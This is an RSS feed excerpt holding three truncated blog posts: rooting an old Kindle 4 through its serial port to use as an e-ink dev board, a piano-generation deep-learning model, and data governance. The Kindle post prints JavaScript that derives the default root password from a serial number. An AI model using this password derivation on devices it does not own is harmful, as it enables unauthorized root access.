				<img width="998" height="1331" src="https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg?w=998" alt="" loading="lazy" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg 998w, https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg?w=225 225w, https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg?w=768 768w" sizes="(max-width: 998px) 100vw, 998px" data-attachment-id="1751" data-permalink="https://blog.lidskialf.net/kindle_serial_magnified/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg" data-orig-size="998,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_serial_magnified" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg?w=225" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_serial_magnified.jpg?w=768">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>I fancied getting an eink screen to use for future projects. I bought a wee one with a raspberry pi “hat” attached. However, I realised later that I could maybe just re-purpose an old Amazon Kindle ebook reader.</p>



<p>I’ve messed with Kindles before, ages ago: I ported an <a href="https://blog.lidskialf.net/2010/10/09/kif-an-infocom-text-adventure-interpreter-for-the-kindle/">Infocom interpreter</a> and a <a href="https://blog.lidskialf.net/2010/10/20/mangle-a-better-manga-reader-for-the-kindle/">Manga</a> reader to it. I managed to get Amazon’s own software to load them as “Kindlets” and show them integrated into their ebook reader. However, now I just want a nice cheap Linux based eink development platform.</p>



<p>Cheap Kindle From Ebay (and why)</p>



<p>So, off to ebay I went! I saw a number of really cheap ones marked “BLOCKED BY AMAZON”; I decided not to go for these since theoretically they might have been stolen. In the end, I went for £7 Kindle 4 “non-touch”.</p>



<p>A few days later, it turned up. And I discovered <em>why</em> it might have been so cheap: its stuck in some sort of unquittable demo mode:</p>



<figure><img data-attachment-id="1725" data-permalink="https://blog.lidskialf.net/kindle_demo_mode/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg" data-orig-size="892,1239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_demo_mode" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=216" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737" src="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737 737w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=108 108w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=216 216w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg 892w" sizes="(max-width: 737px) 100vw, 737px"></figure>



<p>I did some googling and although it seems later Kindle versions can be un-demo-mode-ed, nothing seemed to work for this version. I don’t actually care though; I don’t want to run the original Kindle ebook software on this.</p>



<p>So, the next step is to gain access. Browsing the <a href="https://www.mobileread.com/forums/showthread.php?t=166687">mobileread forums</a> showed it has a debug serial port: time to open the case!</p>



<p>Physical Access Granted!</p>



<p>This was kinda tricky! There are multiple clips all round it and the case is glued onto the battery compartment, so judicious application of a Big Knife was required to persuade it to let go. I cleaned the glue up with some Acetone.</p>



<figure><img data-attachment-id="1729" data-permalink="https://blog.lidskialf.net/kindle_illustrated/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg" data-orig-size="998,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_illustrated" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg?w=225" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg?w=768" src="https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg?w=768" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg?w=225 225w, https://adq454703481.files.wordpress.com/2021/02/kindle_illustrated.jpg 998w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<ul><li>Red: annoying clips</li><li>Purple: <strong>really</strong> annoying glue.</li><li>Yellow: the serial port!</li></ul>



<p>As usual for this sort of thing, the serial port is missing its socket, so we need to solder onto the tiny contacts on the board. I like to use ~0.2mm wirewrap wire for this sort of thing, and the surface mount rework bit for my soldering iron:</p>







<p>I don’t want to leave any wires flapping about, but I also know at some point I’m going to screw up and need serial port console access, so I came up with a solution and attached it:</p>







<p>I superglued a piece of Veroboard onto the kindle’s PCB, then soldered wirewrap wires from the tiny PCB contacts onto one end. Finally, I soldered a larger, more conventional “Dupont” cable socket on the other end so I could easily attach and detach from it. Oh, the top cable on the Kindle PCB is 0v/GND, the others are TX and RX (I forget the order of those two).</p>



<p>Final hurdle: the kindle serial port runs at 1.8v, so I needed a serial port adaptor which supports that:</p>



<figure><img data-attachment-id="1737" data-permalink="https://blog.lidskialf.net/kindle_usbserial/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg" data-orig-size="545,828" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_usbserial" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=197" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=545" src="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=545" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg 545w, https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=99 99w, https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=197 197w" sizes="(max-width: 545px) 100vw, 545px"></figure>



<p>The one I bought does 5v. 3.3v, 2.5v, and 1.8v: it’s pretty neat!</p>



<p>Root Access Granted!</p>



<p>Next, I attached the serial adapter to my laptop, ran the <strong>minicom</strong> serial port software and rebooted the Kindle. Then, once I (inevitably) swapped the TX and RX wires around, I was greeted by this!</p>



<pre><code>U-Boot 2009.08-lab126 (Aug 29 2012 - 12:55:24)

CPU:   Freescale i.MX50 family 1.1V at 800 MHz
mx50 pll1: 800MHz
mx50 pll2: 400MHz
mx50 pll3: 216MHz
ipg clock     : 50000000Hz
ipg per clock : 50000000Hz
uart clock    : 24000000Hz
ahb clock     : 100000000Hz
axi_a clock   : 400000000Hz
axi_b clock   : 200000000Hz
weim_clock    : 100000000Hz
ddr clock     : 800000000Hz
esdhc1 clock  : 80000000Hz
esdhc2 clock  : 80000000Hz
esdhc3 clock  : 80000000Hz
esdhc4 clock  : 80000000Hz
MMC:  FSL_ESDHC: 0, FSL_ESDHC: 1
Board: Tequila
Boot Reason: [POR]
Boot Device: MMC
Board Id: 0031701123730Z56
S/N: B02317022392005M
Initing MDDR memory
ZQ calibration complete: 0x128=0xfffe0010 0x12C=0xffffffff
DRAM:  256 MB
Using default environment

In:    serial
Out:   logbuff
Err:   logbuff
Quick Memory Test 0x70000000, 0x10000000
POST done in 13 ms
Hit any key to stop autoboot:  0 
## Booting kernel from Legacy Image at 70800000 ...
   Image Name:   Linux-2.6.31-rt11-lab126
   Image Type:   ARM Linux Kernel Image (uncompressed)
   Data Size:    4777568 Bytes =  4.6 MB
   Load Address: 70008000
   Entry Point:  70008000
   Verifying Checksum ... OK
   Loading Kernel Image ... OK
OK
Starting kernel ...

[snip]

Welcome to Kindle!

kindle login: </code></pre>



<p>Great, so that’s booting the uboot bootloader, then booting into linux and asking me to login.</p>



<p>Trying to login as root prompts for a password: Hmm… However, I already knew from previous Kindle stuff that you can generate the password from the serial number. I found <a href="https://www.sven.de/kindle/">this website</a> which generates a number of possible passwords for a specific device: Mine was the third on the list.</p>



<p>In case that site dies here’s the key snippet of Javascript:</p>



<pre><code>var md5 = hex_md5(serial);
document.getElementById("rootpw").innerHTML = "fiona" + md5.substring(7,11);
document.getElementById("rootpw2").innerHTML = "fiona" + md5.substring(7,10);
document.getElementById("rootpw3").innerHTML = "fiona" + md5.substr(13,3);</code></pre>



<p>Oh: I forgot to mention how I extracted the device’s serial number. Well, plugging it into USB doesn’t really “work”: you can’t mount these demo devices as disks. But, under linux, it still outputs the serial number in linux’s <strong>dmesg</strong> output (you can also get it using <strong>printenv</strong> in uboot if you press enter when it says “Hit any key to stop autoboot”):</p>



<pre><code>[128033.676587] usb 1-2: new high-speed USB device number 51 using xhci_hcd
[128033.829631] usb 1-2: New USB device found, idVendor=1949, idProduct=0004, bcdDevice= 1.00
[128033.829638] usb 1-2: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[128033.829642] usb 1-2: Product: Amazon Kindle
[128033.829645] usb 1-2: Manufacturer: Amazon
[128033.829648] usb 1-2: SerialNumber: XXXXXXXXXXXXXXXX
</code></pre>



<p>Cool! We have root and can login! Now to figure out how to make it a bit easier to do stuff on it.</p>



<p>Dumping The System</p>



<p>First step is usually to dump the disks for analysis on another computer.</p>



<p>Checking <code>/proc/mounts</code> shows multiple partitions of the main disk on <code>/dev/mmcblk0</code>.</p>



<p>Running <code>fdisk /dev/mmcblk0</code> gives the following:</p>



<pre><code>Units = cylinders of 64 * 512 = 32768 bytes

        Device Boot      Start         End      Blocks  Id System
/dev/mmcblk0p1   *        1025       12224      358400  83 Linux
/dev/mmcblk0p2           12225       14272       65536  83 Linux
/dev/mmcblk0p3           14273       15296       32768  83 Linux
/dev/mmcblk0p4           15297       59776     1423360   b Win95 FAT32</code></pre>



<ul><li>So, four partitions, three linux, and one FAT32. </li><li>The first disk starts quite far into the disk: turns out the kernel is stored in that “missing” area. </li><li>Poking about a bit more shows partition 1 is the normal system, 2 is a sort of diagnostic tool partition, 3 is for storing internal private state of the kindle (eg wifi passwords). Finally, 4 is the one you see when you plug a kindle in over USB: its where your books would reside.</li><li>Partition 4 is mounted at /mnt/us.</li></ul>



<p>I dumped the start of the disk and partitions 1-3 onto /mnt/us using dd (I like to take a complete raw image if I can so I can restore it in case something goes wrong):</p>



<pre><code>dd if=/dev/mmcblk0 of=/mnt/us/kindle.img bs=32768 count=15297</code></pre>



<p>Although this Kindle doesn’t show a disk over USB, since I have root, I can simply make it do it:</p>



<pre><code>rmmod g_file_storage
modprobe g_file_storage file=/dev/mmcblk0p4</code></pre>



<p>It popped up on my laptop so I copied everything off.</p>



<p>System Analysis</p>



<p>Finally, I mounted the partitions in kindle.img on my laptop with:</p>



<pre><code>kpartx -v kindle.img</code></pre>



<p>I could then mount the individual partitions on my laptop. I extracted all the files into a folder so I could poke around them and grep them easily. I figured out:</p>



<ul><li>It uses <code>rc.d</code> as its system init system, so there are lots of nice plain text scripts.</li><li>Init level 5 is the “normal” system running the ebook software</li><li>The ebook software is in <code>/opt/amazon</code> and is in Java (I kinda already knew this, but needed a quick refresher).</li><li>There’s a whole load of interesting plain text “diag” scripts for testing.</li><li>There’s a rather nifty <code>wifid</code> daemon for managing the wifi connection: I figured out how to talk to this from the diag scripts.</li><li>You can write to the eink screen from the command line using the <code>/usr/sbin/eips</code> command (<a href="https://wiki.mobileread.com/wiki/Eips">docs here</a>).</li><li>I couldn’t find an obvious “turn off demo mode” switch: it appears the demo mode is a customised build of the Java ebook software.</li><li>The following system services are to do with unsupported features, the ebook software, or talking back to amazon: <code>S50wan S70wand S75phd S81usbnetd S93webreaderd S94browserd S95framework S96boot_finished</code>.</li></ul>



<p>Talking To Wifid</p>



<p>You can use the built in wifid to connect to wifi and manage your wifi profiles. Oh, also, remember many Kindles only support 2.4Ghz wifi when you wonder why it isn’t working 😉</p>



<p><strong>List number of WIFI profiles:</strong></p>



<p><code>lipc-get-prop com.lab126.wifid profileCount</code></p>



<p><strong>Show contents of a WIFI profile:</strong></p>



<p><code>echo "{index=(0)}" | lipc-hash-prop com.lab126.wifid profileData</code></p>



<p><strong>Delete a WIFI profile:</strong></p>



<p><code>lipc-set-prop com.lab126.wifid deleteProfile WIFIESSID</code></p>



<p><strong>Create a WIFI profile:</strong></p>



<p><code>echo '{essid="WIFIESSID", smethod="wpa2", secured="yes", psk="WIFIPSK"}' | lipc-hash-prop com.lab126.wifid createProfile</code></p>



<p>smethod can be one of open,wep,wpa,wpa2 (if you choose open, set secured to “no”)</p>



<p>WIFIPSK is the WIFI PSK as generated with the <code>wpa_passphrase</code> utility (which is actually on the kindle): a normal “wifi passphrase” will not work.</p>



<p><strong>Connect a WIFI profile:</strong></p>



<p><code>lipc-set-prop com.lab126.wifid cmConnect WIFIESSID</code></p>



<p><strong>Show WIFI connection status:</strong></p>



<p><code>echo "{index = (0)}" | lipc-hash-prop -n com.lab126.wifid currentEssid</code></p>



<p>Making Changes To Root</p>



<p>Many of the following instructions need to change the root disk on the kindle. However, by default it is mounted in read only mode, preventing modification. To fix, run this command on the kindle:</p>



<pre><code>mntroot rw</code></pre>



<p>When done, set it back to read only mode to prevent any unwanted changes:</p>



<pre><code>mntroot ro</code></pre>



<p>Installing Dropbear SSH</p>



<p>I wanted to be able to ssh into my kindle, so I needed to install the <a href="https://matt.ucc.asn.au/dropbear/dropbear.html">dropbear</a> ssh daemon. Of course this is an ARM based device, so I either had to compile it myself or find it somewhere. Luckily …</p></div></article></main></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.lidskialf.net/2021/02/08/turning-an-old-kindle-into-a-eink-development-platform/">https://blog.lidskialf.net/2021/02/08/turning-an-old-kindle-into-a-eink-development-platform/</a></em></p>]]>
            </description>
            <link>https://blog.lidskialf.net/2021/02/08/turning-an-old-kindle-into-a-eink-development-platform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26073463</guid>
            <pubDate>Tue, 09 Feb 2021 03:21:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Learning for Expressive Piano Performances]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26072761">thread link</a>) | @angusturner
<br/>
February 8, 2021 | https://popgun-labs.github.io/ml-blog/generative_models/piano/symbolic_music/2020/02/01/beatnet.html | <a href="https://web.archive.org/web/*/https://popgun-labs.github.io/ml-blog/generative_models/piano/symbolic_music/2020/02/01/beatnet.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <!-- Global site tag (gtag.js) - Google Analytics -->




<!-- mathjax support -->


<h2 id="preface">Preface</h2>

<p>For the last four years, a small team at Popgun has been studying the application of deep learning to music analysis
and generation. This research has culminated in the release of <a href="https://splashpro.popgun.ai/">Splash Pro</a> - a free, AI-powered plugin 
for Digital Audio Workstations (DAWs). With the release of this blog, we hope to provide an accessible introduction to 
deep learning with music, by explaining some core projects we have worked on.</p>

<h2 id="introduction">Introduction</h2>

<p>In this post I want to describe the design of a model for expressive piano synthesis. The model, 
which we call ‘BeatNet’, is capable of analysing a piano performance and generating new pieces that imitate the 
original playing style. Before I get into the technical workings, here are a few samples generated by BeatNet:</p>

<p><strong>In the style of “Yiruma - River Flows In You”</strong>
</p>





<p><strong>In the style of “Chopin - Nocturne in E-flat major, Op. 9, No. 2”</strong>
</p>





<p><strong>In the style of “Errol Garner - Misty”*</strong>
</p>





<p>BeatNet is able to replicate many of the characteristics present in human piano performances, albeit with
some weaknesses and limitations that I will address. To explain how this model works, I have split the 
remainder of the blog into two sections. Part I will discuss musical representations, while Part II will explore the 
model design and showcase more of its capabilities.</p>

<p><span>
*Note: BeatNet does not model sustain pedal events. Sustain was manually added to this piece.
</span></p>

<h2 id="part-i---representations-of-music">Part I - Representations of Music</h2>

<p>In designing a model for music generation, it is critical to choose an appropriate representation. This choice
determines which data can be faithfully encoded, the modelling techniques that are available, and the efficacy of the 
overall system. For this reason, I have decided to begin with a brief explanation of some common musical 
representations. If this all feels familiar to you, feel free to skip ahead to part II.</p>

<h3 id="audio">Audio</h3>

<p>When we talk about audio in machine learning, we are typically referring to an array of time-domain samples. These
samples are a digital approximation to the physical sound pressure wave. The quality of this approximation is
determined by the sample rate and the bit-depth (see: <a href="https://en.wikipedia.org/wiki/Pulse-code_modulation">PCM</a>). In 
research, it is common to see sample rates of 16-22kHz. However, to capture the full range of human audible frequencies,
most HiFi applications (e.g. music, podcasts, etc) use rates of around 44kHz 
(see: <a href="https://en.wikipedia.org/wiki/Nyquist%E2%80%93Shannon_sampling_theorem">Nyquist Theorem</a>).</p>

<p>Because of its high dimensionality, modelling raw audio is extremely challenging. For a generative model to 
reproduce audio structure on a timescale of a few seconds, it must capture the relationships between tens of 
thousands of samples. While it is becoming increasingly feasible to do this (see <a href="#citation-1">[1]</a>), there are more 
efficient ways to encode piano performances.</p>

<p>Note: For an example of music modelling directly in the audio domain, 
see <a href="https://openai.com/blog/jukebox/">OpenAI’s Jukebox</a> <a href="#citation-2">[2]</a>.</p>

<h3 id="midi">MIDI</h3>

<p>MIDI is a technical standard allowing electronic instruments and computers to communicate. It comprises
a sequence of ‘messages’, each describing a particular musical event or instruction. Instructions relating to the 
note timings, pitch and loudness (i.e. velocity) can be transmitted and stored. For example, a piano performance 
encoded as MIDI is a record of which notes were pressed, how forcefully and at what time.</p>

<p>To convert a MIDI file back into listenable audio, a piece of software replays these instructions and
synthesizes the relevant notes. MIDI does not encode acoustic information, such as the instrument sound or the recording
environment. For this reason it is drastically more efficient than audio, and it is a good starting point for our 
exploration.</p>

<p>When working with MIDI we use the terrific <a href="https://github.com/craffel/pretty-midi">PrettyMIDI</a> library by Colin Raffel. This abstracts away many
complexities of the raw format. See Colin Raffel’s <a href="https://colinraffel.com/publications/thesis.pdf">thesis</a> for
a more in-depth explanation of the MIDI file format.</p>

<p><strong>Figure 1 - Für Elise in PrettyMIDI Format</strong></p>
<div><div><pre><code>Note(start=0.000000, end=0.305000, pitch=76, velocity=67)
Note(start=0.300000, end=0.605000, pitch=75, velocity=63)
Note(start=0.600000, end=0.905000, pitch=76, velocity=74)
Note(start=0.900000, end=1.205000, pitch=75, velocity=71)
...
</code></pre></div></div>

<p>Notice how succinctly we can represent Für Elise this way, and consider that the equivalent audio section 
contains approximately 50k samples (for a 44kHz recording).</p>

<h3 id="piano-roll">Piano Roll</h3>

<p>This will look familiar to anyone who has used a Digital Audio Workstation (DAW) such as GarageBand or Ableton.
The vertical axis denotes pitch, and the horizontal axis denotes time. The velocity of each note is encoded
by its magnitude. As well as providing an intuitive way to visualize MIDI, piano roll has some interesting 
properties for machine learning.</p>

<p>For example, consider the effect of raising the song’s pitch by one semitone, or delaying its onset by a few seconds. 
These transpositions preserve the spatial structure of the piano roll. When designing a model we can exploit this 
property by applying 2D Convolutional Neural Networks (CNN). Early experiments at Popgun tried exactly
this, as did <a href="https://youtu.be/nA3YOFUCn4U?t=597">this project</a> using PixelCNN. However, there are some serious drawbacks to this approach.</p>

<p><strong>Figure 2 - Für Elise in Piano Roll Format</strong></p>
<p><img src="https://popgun-labs.github.io/ml-blog/assets/images/piano_roll_fur_elise_crop.png" alt="Für Elise - Piano Roll"></p>

<p>A typical song encoded as piano roll is incredibly sparse: nearly all entries are zero. 
Naively applying a CNN wastes a large amount of computation on entirely empty regions. It is also difficult
to choose a suitable resolution for the time axis. If the original data is quantised, such that each note aligns
perfectly with a uniform musical grid, we can choose the resolution based on the quantisation strength. However,
this breaks down for expressive piano performances, where natural variations in timing are critical to the musicality.</p>

<p>Note: Many works have tried to model piano roll, using a broad range of neural net architectures. For those interested 
to learn more, <a href="https://arxiv.org/abs/1206.6392">this paper</a> is a good starting point <a href="#citation-16">[16]</a>.</p>

<h3 id="time-shift-format">Time-Shift Format</h3>

<p>In 2017 <a href="https://magenta.tensorflow.org/blog/">Google Magenta</a> released a model called Performance RNN <a href="#citation-3">[3]</a>, which demonstrated the ability 
to model expressive piano performances with high fidelity. The key innovation was a new format that is highly 
suited to this task. For reasons that will become apparent, we refer to this “performance representation” simply as 
“time-shift”. Like MIDI, time-shift encodes music with a sequence of discrete musical events. What sets it apart is 
the unique way it encodes the progression of time. Instead of representing time along a specific axis (piano roll), 
or as a property of each individual note (MIDI), in time-shift there is a specific event that indicates the 
advancement of the piece.</p>

<p><strong>Figure 3 - Für Elise in Time-Shift Format</strong></p>
<div><div><pre><code>272 - Set Velocity = 64
76  - Turn On MIDI Note 76 (E5)
317 - Advance Time by 0.3 Seconds
204 - Turn Off MIDI Note 76 (E5)
271 - Set Velocity = 60
75  - Turn On MIDI Note 75 (D#5)
317 - Advance Time by 0.3 Seconds
203 - Turn Off MIDI Note 75 (D#5)
274 - Set Velocity = 72
76  - Turn On MIDI Note 76 (E5)
317 - Advance Time by 0.3 Seconds
204 - Turn Off MIDI Note 76 (E5)
273 - Set Velocity = 68
75  - Turn On MIDI Note 75 (D#5)
317 - Advance Time by 0.3 Seconds
...
</code></pre></div></div>

<p>This one-dimensional sequence of tokens is similar to the encodings used in language models.
This means that modern advances in NLP (e.g. ByteNet <a href="#citation-4">[4]</a>, Transformers <a href="#citation-5">[5]</a>) can be 
readily applied to the time-shift format.</p>

<p><strong>Figure 4 - An Explanation of the Time-Shift Events</strong></p>
<div><div><pre><code>0 - 127: Note on events    
128 - 255: Note off events    
256 - 287: 32 velocity change events   
288 - 387: 100 quantized time-shift values (10ms -&gt; 1000ms)
</code></pre></div></div>

<p>Note: We have not accounted for sustain pedal events, however it might be interesting to incorporate them
in future work.</p>

<h2 id="part-ii---beatnet-a-convolutional-model-for-piano-music">Part II - BeatNet: A Convolutional Model for Piano Music</h2>

<p>In 2016, researchers at Google’s DeepMind lab released the now-famous WaveNet paper <a href="#citation-1">[1]</a>. The core 
insight was that 1D convolutions could produce efficient sequence models, by eliminating the need for expensive 
recurrent computations during training. The efficacy was proven with a 
<a href="https://deepmind.com/blog/article/wavenet-generative-model-raw-audio">demo</a> of raw audio generation. The 
publication of ByteNet <a href="#citation-4">[4]</a> shortly afterwards, extended this idea to the domain of natural language 
processing.</p>

<p>Inspired by this work, Popgun developed its own ByteNet model for symbolic piano music. We refer to this work as
“BeatNet”. The choice to use ByteNet over traditionally dominant RNNs was motivated by a few factors:</p>
<ol>
  <li>The ability to capture long-term dependencies over hundreds or thousands of tokens</li>
  <li>Fast training</li>
  <li>Hype. WaveNet and ByteNet were the first papers to threaten the dominance of RNNs, before Transformer based
architectures <a href="#citation-5">[5]</a> exploded in popularity.</li>
</ol>

<h3 id="data-collection-and-processing">Data Collection and Processing</h3>

<p>We curated a MIDI dataset by drawing from a number of online sources. One key source was the
<a href="http://www.piano-e-competition.com/">Yamaha e-Piano Competition Dataset</a>, consisting of jazz 
and classical music performances. Another source was the <a href="https://colinraffel.com/projects/lmd/">Lakh MIDI Dataset</a>, 
which contains a broader range of genres, including many contemporary pieces.</p>

<p>To create a model which generates highly expressive performances, we processed the data to filter out ‘low quality’ 
items. Anyone who has worked with MIDI datasets will appreciate that many songs sound ‘bad’.
This raises some difficult problems: What is musical quality? How can we account for subjective preferences? 
Are some songs so weird we can confidently deem them ‘not musical’? Suffice to say, these problems are beyond
the scope of this post.</p>

<p>Ultimately, our working solution can be summarised as this: An engineer listened to some data items, in each case 
proclaiming “Yep, this sounds musical” or “Nope, I don’t like it”. In the process, they developed automated heuristics
to filter unwanted items, biasing the dataset towards songs that are subjectively ‘musical’. In the future it would be 
interesting to crowd-source these assessments, or to devise heuristics based on music theory instead.</p>

<h3 id="a-working-prototype">A Working Prototype</h3>

<p>We completed our first working prototype in July 2017. It is …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://popgun-labs.github.io/ml-blog/generative_models/piano/symbolic_music/2020/02/01/beatnet.html">https://popgun-labs.github.io/ml-blog/generative_models/piano/symbolic_music/2020/02/01/beatnet.html</a></em></p>]]>
            </description>
            <link>https://popgun-labs.github.io/ml-blog/generative_models/piano/symbolic_music/2020/02/01/beatnet.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26072761</guid>
            <pubDate>Tue, 09 Feb 2021 01:33:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why data governance is critical for advanced analytics, ML and Automation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26072506">thread link</a>) | @siganakis
<br/>
February 8, 2021 | https://growingdata.com.au/pragmatic-data-governance-is-critical-for-advanced-analytics-machine-learning-automation/ | <a href="https://web.archive.org/web/*/https://growingdata.com.au/pragmatic-data-governance-is-critical-for-advanced-analytics-machine-learning-automation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5868" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<div>
<div>
<div>
<div>
<p>Data Governance seeks to bring order to the chaos that emerges as organisations turn to data to make decisions. To many, the term “data” is synonymous with “fact”, forgetting the fact that data requires context to be properly interpreted. Context varies by department, business unit across teams and even within teams, leading to misinterpretation of data and increasing the risk that data is misrepresented. Data Governance helps to define rules, processes and policies for how data is collected, managed to ensure that it can be consistently interpreted and applied to advanced analytics, machine learning and automation. </p>
<p>Analytics platforms like PowerBI, Tableau and Looker put data in the hands of employees and promise better decisions based on real data. But what happens when a colleagues number is different from yours? Or when people don’t know which version of a dashboard to view? Or when you discover the “Sales metric” you have been making decisions on doesn’t actually include all the things you thought it does?</p>
<p>Machine Learning has the capability to transform all aspects of business, from recommending products to your customers, optimising call routing in your call centre through to segmenting marketing messages. As organisations become more reliant on these technologies, they are more likely to incorporate them deeper into their processes leaving them vulnerable to prickly edge cases. Machine learning fails are already well-publicised, from<a href="https://www.reuters.com/article/us-amazon-com-jobs-automation-insight-idUSKCN1MK08G" rel="nofollow"> sexist recruitment AI at Amazon</a>, or <a href="https://twitter.com/geraldmellor/status/712880710328139776?lang=en" rel="nofollow">Microsoft’s AI Twitter Bot “Tay” who lasted less than 24 hours before going full racist.</a></p>
<p>Automation, especially when combined with Machine Learning makes organisations more efficient and more scalable. Marketing Automation provides marketers with super-powers to deliver the right message to the right customer at the right time. However, when automation fails (often due to errors in data), the problems are amplified – as one mistake can set off a chain of events that can destroy organisations.</p>
<h2 id="Introduction"><span>Introduction</span></h2>
<p>To help illustrate the importance of Data Governance, we will use a fictional company, which has run into an equally fictional set of challenges. Forrest Corp, is an online book retailer with approximately 100 staff, based in Melbourne, Australia. As with many organisations of this size, Forest Corp has functional teams responsible for Marketing, Finance, Technology, Customer Service and Operations. Forrest Corp has been wildly successful, with sales exploding throughout COVID-19 lockdowns.</p>
<p><strong>The problem</strong></p>
<p>The executive team is very displeased that gross margins and profitability have deteriorated sharply, and that their personal (managed) Instagram feeds are blowing up with negative messages. They want answers! In speaking with leaders from different teams, they receive mixed messages:</p>
<ul><li>Marketing is excited to show a 10% increase in sales due to a Social Media Influencer campaign and finds it difficult to believe things are as bad as they are made out to be</li><li>Finance says sales are flat, with rising inventories, shipping costs and customer retention costs hurting margins and profitability</li><li>Customer service is inundated with complaints, but they feel they have it under control using their existing policies and procedures</li><li>Operations confirm the increase in sales, but their team is overworked in dealing with the influx of sales and a large number of returns.</li></ul>
<p>An analysis by an external analytics consultancy begins to unravel the story:</p>
